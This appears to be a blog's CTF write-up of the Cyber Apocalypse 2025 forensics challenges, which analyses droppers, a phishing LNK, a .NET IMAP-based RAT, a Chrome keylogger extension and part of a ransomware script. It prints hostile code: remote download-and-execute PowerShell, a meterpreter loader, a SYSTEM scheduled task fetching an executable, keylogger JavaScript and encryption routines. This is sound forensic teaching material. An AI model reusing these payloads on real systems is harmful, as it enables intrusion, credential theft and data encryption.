---

title: Cyber Apocalypse 2025 - Writeups

date: 2025-03-26

draft: false

description: "This page contains writeups for forensic challenge from the Cyber Apocalypse 2025 CTF."

summary: "This page contains Cyber Apocalypse 2025 CTF writeups, covering all challenges in the forensics category."

tags: ["ctf"]

categories: ["ctf"]

---

  

## Forensics

  

### Thorin’s Amulet

  

> Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

  

![](https://i.imgur.com/RuJJk3R.png)

  

Flag: `HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}`

#### Challenge File: `artifact.ps1`  
```powershell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```  

#### Step 1: Decoding the Base64 Payload  
The script contains a Base64-encoded PowerShell command. Decoding it using [CyberChef](https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=U1VWWUlDaE9aWGN0VDJKcVpXTjBJRTVsZEM1WFpXSkRiR2xsYm5RcExrUnZkMjVzYjJGa1UzUnlhVzVuS0NKb2RIUndPaTh2YTI5eWNDNW9kR0l2ZFhCa1lYUmxJaWs9) reveals:  
```powershell
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```  
This command downloads and executes a script from `http://korp.htb/update`.  

#### Step 2: Fetching the Update Script  
After adding the Docker instance’s IP to `/etc/hosts`, we fetch the `/update` endpoint:  
```shell
┌──(kali㉿kali)-[~]
└─$ curl http://korp.htb:54742/update
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```  

#### Step 3: Retrieving the Secondary Payload  
Modifying the script to match the Docker port and fetching `a541a.ps1`:  
```shell
┌──(kali㉿kali)-[~]
└─$ curl -H "X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d" http://korp.htb:54742/a541a
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```  

#### Step 4: Decoding the Hex Payload  
The script converts a hex string to ASCII. Using [CyberChef](https://cyberchef.org/#recipe=From_Hex('None')&input=NDg1NDQyN2IzNzY4MzA1MjMxNGU1ZjQ4MzQzNTVmMzQ2YzU3MzQ1OTM1NWYzODMzMzM2ZTVmMzQ0ZTVmMzk3MjMzMzQzNzVmMzE0ZTU2MzM2ZTM3MzA3Mjdk):  
![](https://i.imgur.com/THd7jOz.png)  


---

### A new Hire

  

> The Royal Archives of Eldoria have recovered a mysterious document—an old resume once belonging to Lord Malakar before his fall from grace. At first glance, it appears to be an ordinary record of his achievements as a noble knight, but hidden within the text are secrets that reveal his descent into darkness.

  

![](https://i.imgur.com/ui6YXCE.png)


  

Flag: `HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}`
#### Phishing Email Analysis
We're given an EML file containing a job application phishing email. The email includes a link for the recipient to access:
![](https://i.imgur.com/UPTESi1.png)

#### Initial Investigation
1. **Hosts File Modification**:
   Added the Docker instance IP to `/etc/hosts` to access the domain.

2. **Page Source Analysis**:
   Found an interesting script in the page resources:
   ```html
   <script defer="defer">
       setTimeout(() => {
         document.getElementById('loading').style.display = 'none';
         document.getElementById('main-content').style.display = 'flex';
       }, 5000);

       function getResume() {
         window.location.href=`search:displayname=Downloads&subquery=\\\\${window.location.hostname}@${window.location.port}\\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\`;
       }
   </script>
   ```

#### Malicious Shortcut Discovery
The script navigates to:
```
http://storage.microsoftcloudservices.com:41275/3fe1690d955e8fd2a0b282501570e1f4/resumes
```
This directory contains a malicious shortcut disguised as `Resume.pdf.lnk`:
![](https://i.imgur.com/ChwS4XO.png)

#### LNK File Analysis
Used [Eric Zimmerman's LECmd](https://ericzimmerman.github.io/#!index.md) to parse the shortcut file, revealing the following arguments:
```shell
Arguments: /c powershell.exe -W Hidden -nop -ep bypass -NoExit -E WwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJwBtAHMAZQBkAGcAZQAnACwAIAAnAGgAdAB0AHAAOgAvAC8AcwB0AG8AcgBhAGcAZQAuAG0AaQBjAHIAbwBzAG8AZgB0AGMAbABvAHUAZABzAGUAcgB2AGkAYwBlAHMALgBjAG8AbQA6ADQANAAwADkANAAvADMAZgBlADEANgA5ADAAZAA5ADUANQBlADgAZgBkADIAYQAwAGIAMgA4ADIANQAwADEANQA3ADAAZQAxAGYANAAvAHIAZQBzAHUAbQBlAHMAUwAvAHIAZQBzAHUAbQBlAF8AbwBmAGYAaQBjAGkAYQBsAC4AcABkAGYAJwApADsAXABcAHMAdABvAHIAYQBnAGUALgBtAGkAYwByAG8AcwBvAGYAdABjAGwAbwB1AGQAcwBlAHIAdgBpAGMAZQBzAC4AYwBvAG0AQAA0ADQAMAA5ADQAXAAzAGYAZQAxADYAOQAwAGQAOQA1ADUAZQA4AGYAZAAyAGEAMABiADIAOAAyADUAMAAxADUANwAwAGUAMQBmADQAXABwAHkAdABoAG8AbgAzADEAMgBcAHAAeQB0AGgAbwBuAC4AZQB4AGUAIABcAFwAcwB0AG8AcgBhAGcAZQAuAG0AaQBjAHIAbwBzAG8AZgB0AGMAbABvAHUAZABzAGUAcgB2AGkAYwBlAHMALgBjAG8AbQBAADQANAAwADkANABcADMAZgBlADEANgA5ADAAZAA5ADUANQBlADgAZgBkADIAYQAwAGIAMgA4ADIANQAwADEANQA3ADAAZQAxAGYANABcAGMAbwBuAGYAaQBnAHMAXABjAGwAaQBlAG4AdAAuAHAAeQA=
```

#### Decoding the Payload
The Base64-encoded command decodes to:
```powershell
[System.Diagnostics.Process]::Start('msedge', 'http://storage.microsoftcloudservices.com:44094/3fe1690d955e8fd2a0b282501570e1f4/resumesS/resume_official.pdf');
\\storage.microsoftcloudservices.com@44094\3fe1690d955e8fd2a0b282501570e1f4\python312\python.exe \\storage.microsoftcloudservices.com@44094\3fe1690d955e8fd2a0b282501570e1f4\configs\client.py
```

#### Python Script Analysis
The `client.py` script contains:
```python
import base64

key = base64.decode("SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJjaD0xbjF0MTRsXzRjYzNzISF9Cg==")

data = base64.b64decode("c97FeXRj6jeG5P74ANItMBNAPIlhyeTnf9gguC3OwmDQHdacg769Y...)

meterpreter_data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

exec(zlib.decompress(meterpreter_data))
```

#### Flag Extraction
The `key` variable contains a Base64-encoded string. Decoding it using [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=U0ZSQ2V6UlFWRjh5T0Y4MGJtUmZiVEZqY2pCek1HWjBYM016TkhKamFEMHhiakYwTVRSc1h6UmpZek56SVNGOUNnPT0) reveals the flag:
```
HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}
```
![](https://i.imgur.com/WUKkL1m.png)

---
### Silent Trap
> A critical incident has occurred in Tales from Eldoria, trapping thousands of players in the virtual world with no way to log out. The cause has been traced back to Malakar, a mysterious entity that launched a sophisticated attack, taking control of the developers' and system administrators' computers. With key systems compromised, the game is unable to function properly, which is why players remain trapped in Eldoria. Now, you must investigate what happened and find a way to restore the system, freeing yourself from the game before it's too late.

![](https://i.imgur.com/2HkMrvC.png)

Flags:
```
1. What is the subject of the first email that the victim opened and replied to?
Game Crash on Level 5

2. On what date and time was the suspicious email sent? (Format: YYYY-MM-DD_HH:MM) (for example: 1945-04-30_12:34)
2025-02-24_15:46

3. What is the MD5 hash of the malware file?
c0b37994963cc0aadd6e78a256c51547

4. What credentials were used to log into the attacker's mailbox? (Format: username:password)
proplayer@email.com:completed

5. What is the name of the task scheduled by the attacker?
Synchronization

6. What is the API key leaked from the highly valuable file discovered by the attacker?
sk-3498fwe09r8fw3f98fw9832fw
```

#### Initial Investigation

We're given a `capture.pcapng` containing email communications. After extracting all HTTP objects, we find multiple HTML-formatted emails:
![](https://i.imgur.com/H9rATcC.png)

#### Email Analysis

##### 1. First Email (Victim's Reply)
Found via filename containing `*_action=compose`:
- **Subject**: `Game Crash on Level 5` (Answer to Q1)
![](https://i.imgur.com/K4MSsLo.png)

##### 2. Suspicious Email
Found via filename containing `*_action=preview`:
- **Subject**: `Bug Report - In-game Imbalance Issue in Eldoria`
- **Timestamp**: `2025-02-24_15:46` (Answer to Q2)
![](https://i.imgur.com/ayVr6SJ.png)

#### Malware Extraction

##### Zip File Retrieval
Found via filename containing `*_download=1`:
- **Password**: `eldoriaismylife` (from attacker's email)
![](https://i.imgur.com/VXcyyqK.png)

##### File Analysis
```bash
┌──(kali㉿kali)-[~/Desktop/Silent Trap/extracted_http_objects]
└─$ md5sum Eldoria_Balance_Issue_Report.pdf.exe
c0b37994963cc0aadd6e78a256c51547  # Answer to Q3

┌──(kali㉿kali)-[~/Desktop/Silent Trap/extracted_http_objects]
└─$ file Eldoria_Balance_Issue_Report.pdf.exe 
Eldoria_Balance_Issue_Report.pdf.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly
```

#### Complete Malware Code Analysis (dnSpy)

##### 1. Persistence Mechanism
```csharp
string text = "move /Y email.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\email.exe\"";
```

##### 2. C2 Communication
```csharp
private static void connect(string server, int port)
{
    try
    {
        Program.tcp = new TcpClient(server, port);
        Program.ssl = Program.tcp.GetStream();
    }
    catch { return; }
}

private static void Login(string login, string password)
{
    byte[] bytes = Encoding.ASCII.GetBytes(string.Concat(new string[] { "$ LOGIN ", login, " ", password, "\r\n" }));
    Program.ssl.Write(bytes, 0, bytes.Length);
    byte[] array = new byte[512];
    Program.ssl.Read(array, 0, 512);
}
```

##### 3. Complete XOR Encryption Implementation
```csharp
public class Exor
{
    public static byte[] Encrypt(byte[] pwd, byte[] data)
    {
        int[] array = new int[256];
        int[] array2 = new int[256];
        byte[] array3 = new byte[data.Length];
        int i;
        for (i = 0; i < 256; i++)
        {
            array[i] = (int)pwd[i % pwd.Length];
            array2[i] = i;
        }
        int num;
        for (i = (num = 0); i < 256; i++)
        {
            num = (num + array2[i] + array[i]) % 256;
            int num2 = array2[i];
            array2[i] = array2[num];
            array2[num] = num2;
        }
        int num3;
        num = (num3 = (i = 0));
        while (i < data.Length)
        {
            num3++;
            num3 %= 256;
            num += array2[num3];
            num %= 256;
            int num2 = array2[num3];
            array2[num3] = array2[num];
            array2[num] = num2;
            int num4 = array2[(array2[num3] + array2[num]) % 256];
            array3[i] = (byte)((int)data[i] ^ num4);
            i++;
        }
        return array3;
    }
}

public static byte[] xor(byte[] data)
{
    return Exor.Encrypt(new byte[]
    {
        168, 115, 174, 213, 168, 222, 72, 36, 91, 209,
        242, 128, 69, 99, 195, 164, 238, 182, 67, 92,
        7, 121, 164, 86, 121, 10, 93, 4, 140, 111,
        248, 44, 30, 94, 48, 54, 45, 100, 184, 54,
        28, 82, 201, 188, 203, 150, 123, 163, 229, 138,
        177, 51, 164, 232, 86, 154, 179, 143, 144, 22,
        134, 12, 40, 243, 55, 2, 73, 103, 99, 243,
        236, 119, 9, 120, 247, 25, 132, 137, 67, 66,
        111, 240, 108, 86, 85, 63, 44, 49, 241, 6,
        3, 170, 131, 150, 53, 49, 126, 72, 60, 36,
        144, 248, 55, 10, 241, 208, 163, 217, 49, 154,
        206, 227, 25, 99, 18, 144, 134, 169, 237, 100,
        117, 22, 11, 150, 157, 230, 173, 38, 72, 99,
        129, 30, 220, 112, 226, 56, 16, 114, 133, 22,
        96, 1, 90, 72, 162, 38, 143, 186, 35, 142,
        128, 234, 196, 239, 134, 178, 205, 229, 121, 225,
        246, 232, 205, 236, 254, 152, 145, 98, 126, 29,
        217, 74, 177, 142, 19, 190, 182, 151, 233, 157,
        76, 74, 104, 155, 79, 115, 5, 18, 204, 65,
        254, 204, 118, 71, 92, 33, 58, 112, 206, 151,
        103, 179, 24, 164, 219, 98, 81, 6, 241, 100,
        228, 190, 96, 140, 128, 1, 161, 246, 236, 25,
        62, 100, 87, 145, 185, 45, 61, 143, 52, 8,
        227, 32, 233, 37, 183, 101, 89, 24, 125, 203,
        227, 9, 146, 156, 208, 206, 194, 134, 194, 23,
        233, 100, 38, 158, 58, 159
    }, data);
}
```

##### 4. Command Execution
```csharp
private static void execute(string[] commands)
{
    try
    {
        Program.connect(Program.creds.Split(new char[] { ':' })[2], 143);
        Program.Login(Program.creds.Split(new char[] { ':' })[0], Program.creds.Split(new char[] { ':' })[1]);
    }
    catch
    {
        try
        {
            // Fallback connection attempt
        }
        catch
        {
        }
    }

    foreach (string text in commands)
    {
        if (text.Contains("change_"))
        {
            Program.change(text);
        }
        else
        {
            string text2 = Program.cmd(text);
            text2 = Convert.ToBase64String(Program.xor(Encoding.UTF8.GetBytes(text2)));
            Program.create(text2);
        }
    }
}
```

##### 5. File Operations
```csharp
private static string[] readFile()
{
    Program.connect(Program.creds.Split(new char[] { ':' })[2], 143);
    Program.Login(Program.creds.Split(new char[] { ':' })[0], Program.creds.Split(new char[] { ':' })[1]);
    try
    {
        Program.selectFolder("Drafts");
    }
    catch
    {
        Program.selectFolder("INBOX.Drafts");
    }
    string[] array = Program.searchMessages(Program.comp_id);
    if (array.Length == 0)
    {
        return new string[0];
    }
    string text = array[array.Length - 1];
    string text2 = "";
    for (int i = 0; i < array.Length; i++)
    {
        byte[] array2 = Program.xor(Convert.FromBase64String(Program.getMessage(text)));
        text2 = Encoding.UTF8.GetString(array2);
    }
    string[] array3 = new string[0];
    foreach (string text3 in text2.Split(new char[] { '\n' }))
    {
        if (!text3.Contains(" OK") && text3.Length > 1)
        {
            Array.Resize<string>(ref array3, array3.Length + 1);
            array3[array3.Length - 1] = text3.Trim(new char[] { '\r' }).Trim(new char[] { ')' });
        }
    }
    return array3;
}
```

##### 6. Main Initialization
```csharp
static Program()
{
    string[] array = new string[5];
    array[0] = Environment.MachineName;
    array[1] = "_";
    array[2] = Environment.UserName;
    array[3] = "_";
    int num = 4;
    OperatingSystem osversion = Environment.OSVersion;
    array[num] = ((osversion != null) ? osversion.ToString() : null);
    Program.comp_id = Program.Base64Encode(string.Concat(array));
    Program.creds = "proplayer@email.com:completed:mail.korptech.net:0000000000000000000000000000000000000000000000000000000";
    Program.r_creds = "proplayer1@email.com:completed:mail.korptech.net:000000000000000000000000000000000000000000000000000000000";
    Program.ssl = null;
    Program.tcp = null;
}
```

#### Network Traffic Analysis

##### 1. Tshark Command for IMAP Data
```bash
tshark -r capture.pcapng -Y 'imap contains "APPEND Inbox"' -T fields -e imap.request | grep -oP 'PM_report_[^,]+\K,[A-Za-z0-9+/=]+' | cut -c2- > output.txt
```

Sample output:
```
VGiPTdHXQGP876EbMX2FJhm3ZazpvA8aO8jT1uC8xPhDZq/Np5oZQnHUpKxc36FHBznusaFRsSPtnJzlC4qyGNxcWMCIs1qdVzygFbDj0se4vntsvpU9rKvQPLcPERIjLB36+ws5PVmzVsnuxNmgUPegSj+VPrRfrcHkaE0PKHVKjXgoGdmRJd2PDG7SWRcBDwNp8EC7UfDTqZp7EDWJYUJuBLfFYh4tpc/MCfKw++nXu5YZ/FWE9pkrWq4=
VGiPTdHXQGP876EbMX2FJhm3ZazpvA8aO8jT1uC8xPhDZq/Np5oZQnHUpKxc36FHBznusaFRsSPtnJzlC4qyGNxcWMCIs1qdVzygFbDj0se4vntsvpU9rKvQPLcPERIjLB36+ws5PVmzVsnuxNmgUPegSj+VPrRfrcHkaE0VL2xOwD58M8+JNMSMUH/CSVV/KFxDiECrU/Pg/psFf0rtQxVXdJjhYB01oN7beNOq6vTRp4UZ9VmU74I3RfZTpCKkuGpF8lbct/WB0KYOKTz9M/MJnadATIYB6mIGCBnalXAGG+rtciH78pb9BIMAK3cAnRO1lUs6XwNZyX/2J5npVXt4FRZihG54E8+wp3c=
```

##### 2. Complete Python Decryption Script
```python
import base64
import argparse

def xor_encrypt_decrypt(key, data):
    # Initialize the arrays
    array = [key[i % len(key)] for i in range(256)]
    array2 = list(range(256))
    array3 = bytearray(len(data))

    # Key Scheduling Algorithm (KSA)
    j = 0
    for i in range(256):
        j = (j + array2[i] + array[i]) % 256
        array2[i], array2[j] = array2[j], array2[i]

    # Pseudo-Random Generation Algorithm (PRGA)
    i = j = 0
    for k in range(len(data)):
        i = (i + 1) % 256
        j = (j + array2[i]) % 256
        array2[i], array2[j] = array2[j], array2[i]
        t = (array2[i] + array2[j]) % 256
        keystream_byte = array2[t]
        array3[k] = data[k] ^ keystream_byte

    return bytes(array3)

def process_file(file_path, key):
    try:
        with open(file_path, 'r') as file:
            for line in file:
                base64_input = line.strip()
                if base64_input:
                    try:
                        decoded_data = base64.b64decode(base64_input)
                        decrypted_data = xor_encrypt_decrypt(key, decoded_data)
                        try:
                            decrypted_text = decrypted_data.decode('utf-8')
                            print(f"\nDecrypted Data (Base64: ...{base64_input[-10:]}):\n {decrypted_text}\n-+-+-+-+-+-+-+-+-+-+")
                        except UnicodeDecodeError:
                            print(f"\nThe decrypted data from Base64 {base64_input[:10]}... could not be decoded as UTF-8.\n-+-+-+-+-+-+-+-+-+-+")
                    except base64.binascii.Error:
                        print(f"Invalid Base64 encoding found in line: {base64_input[:10]}...\n-+-+-+-+-+-+-+-+-+-+")
                else:
                    print("Empty line detected, skipping.\n-+-+-+-+-+-+-+-+-+-+")
    except FileNotFoundError:
        print(f"File not found: {file_path}")
    except Exception as e:
        print(f"An error occurred: {e}")

def main():
    parser = argparse.ArgumentParser(description="Decrypt Base64-encoded data using XOR encryption.")
    parser.add_argument('file_path', help="Path to the file containing Base64 encoded data.")
    
    args = parser.parse_args()

    key = bytearray([
        168, 115, 174, 213, 168, 222, 72, 36, 91, 209,
        242, 128, 69, 99, 195, 164, 238, 182, 67, 92,
        7, 121, 164, 86, 121, 10, 93, 4, 140, 111,
        248, 44, 30, 94, 48, 54, 45, 100, 184, 54,
        28, 82, 201, 188, 203, 150, 123, 163, 229, 138,
        177, 51, 164, 232, 86, 154, 179, 143, 144, 22,
        134, 12, 40, 243, 55, 2, 73, 103, 99, 243,
        236, 119, 9, 120, 247, 25, 132, 137, 67, 66,
        111, 240, 108, 86, 85, 63, 44, 49, 241, 6,
        3, 170, 131, 150, 53, 49, 126, 72, 60, 36,
        144, 248, 55, 10, 241, 208, 163, 217, 49, 154,
        206, 227, 25, 99, 18, 144, 134, 169, 237, 100,
        117, 22, 11, 150, 157, 230, 173, 38, 72, 99,
        129, 30, 220, 112, 226, 56, 16, 114, 133, 22,
        96, 1, 90, 72, 162, 38, 143, 186, 35, 142,
        128, 234, 196, 239, 134, 178, 205, 229, 121, 225,
        246, 232, 205, 236, 254, 152, 145, 98, 126, 29,
        217, 74, 177, 142, 19, 190, 182, 151, 233, 157,
        76, 74, 104, 155, 79, 115, 5, 18, 204, 65,
        254, 204, 118, 71, 92, 33, 58, 112, 206, 151,
        103, 179, 24, 164, 219, 98, 81, 6, 241, 100,
        228, 190, 96, 140, 128, 1, 161, 246, 236, 25,
        62, 100, 87, 145, 185, 45, 61, 143, 52, 8,
        227, 32, 233, 37, 183, 101, 89, 24, 125, 203,
        227, 9, 146, 156, 208, 206, 194, 134, 194, 23,
        233, 100, 38, 158, 58, 159
    ])

    process_file(args.file_path, key)

if __name__ == "__main__":
    main()
```

#### Decrypted Command Outputs
```bash
Decrypted Data (Base64: ...HsvGi0r9g=):
 Microsoft Windows [Version 10.0.19045.5487]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dev-support\Desktop>schtasks /create /tn Synchronization /tr "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\Temp\rakalam.exe" /sc minute /mo 1 /ru SYSTEM

Decrypted Data (Base64: ...0ftml7fg==):
 Microsoft Windows [Version 10.0.19045.5487]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dev-support\Desktop>more C:\backups\credentials.txt
[Database Server]
host=db.internal.korptech.net
username=dbadmin
password=rY?ZY_65P4V0

[Game API]
host=api.korptech.net
api_key=sk-3498fwe09r8fw3f98fw9832fw

[SSH Access]
host=dev-build.korptech.net
username=devops
password=BuildServer@92|7Gy1lz'Xb
port=2022
```


---

  

### Stealth Invasion

> Selene's normally secure laptop recently fell victim to a covert attack. Unbeknownst to her, a malicious Chrome extension was stealthily installed, masquerading as a useful productivity tool. Alarmed by unusual network activity, Selene is now racing against time to trace the intrusion, remove the malicious software, and bolster her digital defenses before more damage is done.

![](https://i.imgur.com/8e0ODb8.png)


  

Flags:
```
1. What is the PID of the Original (First) Google Chrome process:
   4080
   
2. What is the only Folder on the Desktop
   malext
   
3. What is the Extention's ID (ex: hlkenndednhfkekhgcdicdfddnkalmdm)
   nnjofihdjilebhiiemfmdlpbdkbjcpae
   
4. After examining the malicious extention's code, what is the log filename in which the data is stored
   000003.log
   
5. What is the URL the user navigated to
   drive.google.com
   
6. What is the password of selene@rangers.eldoria.com
   clip-mummify-proofs
```

  
#### 1. Initial Processing with MemProcFS
```cmd
MemProcFS.exe -f memdump.elf -forensic 1
```

#### 2. Process Analysis (Question 1)
Location: `sys\proc\proc.txt`

**First Chrome Process Found**:
```
--- chrome.exe                4080   5296     U* selene           2025-03-13 17:01:04 UTC                      ***
```
**Answer**: `4080`

#### 3. Desktop Contents (Question 2)
Location: `forensic\files\ROOT\Users\selene\Desktop`

**Directory Listing**:
![](https://i.imgur.com/B0pDL1j.png)

**Answer**: `malext`

#### 4. Malicious Extension Analysis

###### a. Extension Code (background.js)
```javascript
function addLog(s) {
    if (s.length != 1 && s !== "Enter" && !s.startsWith("PASTE"))  {
        s = `|${s}|`;
    } else if (s === "Enter" || s.startsWith("PASTE")) {
        s = s + "\r\n";
    }

    chrome.storage.local.get(["log"]).then((data) => {
        if (!data.log) {
            data.log = "";
        }

        data.log += s;

        chrome.storage.local.set({ 'log': data.log });
    });
}

chrome.runtime.onConnect.addListener((port) => {
    console.assert(port.name === "conn");
    console.log("v1.2.1");

    port.onMessage.addListener( ({ type, data }) => {
        if (type === 'key') {
            addLog(data);
        } else if (type == 'paste') {
            addLog('PASTE:' + data);
        }
    });
});

chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        if (request.check === "replace_html" && chrome.storage.local.get("replace_html")) {
            sendResponse({ url: chrome.storage.local.get('replace_html_url')});
        }
    }
);
```

###### b. Extension Location
Path: `forensic\files\ROOT\Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae`

**Extension ID Found**:
![](https://i.imgur.com/Ifm1VQ1.png)

**Answer**: `nnjofihdjilebhiiemfmdlpbdkbjcpae`

#### 5. Keylogger Log Analysis

###### a. Log File Location
Found in extension storage: `000003.log`

###### b. Log Contents
![](https://i.imgur.com/AT7Z8Wg.png)

Key findings:
- **Visited URL**: `drive.google.com`
- **Captured Password**: `clip-mummify-proofs`

---

  

### Cave Expedition

  

> Rumors of a black drake terrorizing the fields of Dunlorn have spread far and wide. The village has offered a hefty bounty for its defeat. Sir Alaric and Thorin answered the call also returning with treasures from its lair. Among the retrieved items they found a map. Unfortunately it cannot be used directly because a custom encryption algorithm was probably used. Luckily it was possible to retrieve the original code that managed the encryption process. Can you investigate about what happened and retrieve the map content?

  

![](https://i.imgur.com/2BNmPDc.png)

  

Flag: `HTB{Dunl0rn_dRAk3_LA1r_15_n0W_5AF3}`


#### Initial Investigation
Using Chainsaw to analyze EVTX logs:
```cmd
chainsaw_x86_64-pc-windows-msvc.exe hunt C:\Users\flare\Desktop\forensics_cave_expedition\Logs -s sigma/ --mapping mappings/sigma-event-logs-all.yml -r rules/ --csv -o C:\Users\flare\Desktop\forensics_cave_expedition\Logs\logs.csv
```

#### Suspicious Activity Found
Non-interactive PowerShell process spawned:
![](https://i.imgur.com/S7c5Rnh.png)

#### Malicious Batch Script Execution
```evtx
ParentCommandLine: C:\Windows\system32\cmd.exe /c ""C:\Users\developer56546756\Desktop\avAFGrw41.bat""
ParentUser: WORKSTATION5678\developer56546756
ParentProcessId: 5364
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2025-01-28 10:31:17.554
RuleName: '-'
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell  -c "'JGszNFZtID0gIktpNTBlSFFnS2k1a2IyTWdLaTVrYjJONElDb3VjR1JtIg0KJG03OFZvID0gIkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFFwWlQxVlNJRVpKVEVWVElFaEJWa1VnUWtWRlRpQkZUa05TV1ZCVVJVUWdRbGtnUVNCU1FVNVRUMDFYUVZKRkNpb2dWMmhoZENCb1lYQndaVzVsWkQ4S1RXOXpkQ0J2WmlCNWIzVnlJR1pwYkdWeklHRnlaU0J1YnlCc2IyNW5aWElnWVdOalpYTnphV0pzWlNCaVpXTmhkWE5sSUhSb1pYa2dhR0YyWlNCaVpXVnVJR1Z1WTNKNWNIUmxaQzRnUkc4Z2JtOTBJ' | Out-File -Encoding ascii -FilePath b -NoNewline"
```

#### Complete Malicious PowerShell Script
```powershell
$k34Vm = "Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"
$m78Vo = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo="
$a53Va = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
$b64Vb = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"

$e90Vg = @{}
$f12Vh = @{}

For ($x = 65; $x -le 90; $x++) {
    $e90Vg[([char]$x)] = if($x -eq 90) { [char]65 } else { [char]($x + 1) }
}

function n90Vp {
     [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m78Vo))
}

function l56Vn {
    return (a12Vc $k34Vm).Split(" ")
}

For ($x = 97; $x -le 122; $x++) {
    $e90Vg[([char]$x)] = if($x -eq 122) { [char]97 } else { [char]($x + 1) }
}

function a12Vc {
    param([string]$a34Vd)
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a34Vd))
}

$c56Ve = a12Vc $a53Va
$d78Vf = a12Vc $b64Vb

For ($x = 48; $x -le 57; $x++) {
    $e90Vg[([char]$x)] = if($x -eq 57) { [char]48 } else { [char]($x + 1) }
}

$e90Vg.GetEnumerator() | ForEach-Object {
    $f12Vh[$_.Value] = $_.Key
}

function l34Vn {
    param([byte[]]$m56Vo, [byte[]]$n78Vp, [byte[]]$o90Vq)
    $p12Vr = [byte[]]::new($m56Vo.Length)
    for ($x = 0; $x -lt $m56Vo.Length; $x++) {
        $q34Vs = $n78Vp[$x % $n78Vp.Length]
        $r56Vt = $o90Vq[$x % $o90Vq.Length]
        $p12Vr[$x] = $m56Vo[$x] -bxor $q34Vs -bxor $r56Vt
    }
    return $p12Vr
}

function s78Vu {
